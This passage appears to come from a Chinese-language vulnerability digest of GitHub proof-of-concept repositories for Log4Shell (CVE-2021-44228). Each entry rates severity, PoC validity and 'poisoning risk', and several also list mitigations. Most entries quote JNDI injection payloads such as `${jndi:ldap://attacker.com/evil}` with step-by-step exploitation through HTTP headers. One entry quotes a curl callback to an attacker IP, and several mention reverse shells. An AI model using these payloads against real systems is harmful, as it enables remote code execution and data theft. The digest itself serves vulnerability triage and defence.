3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

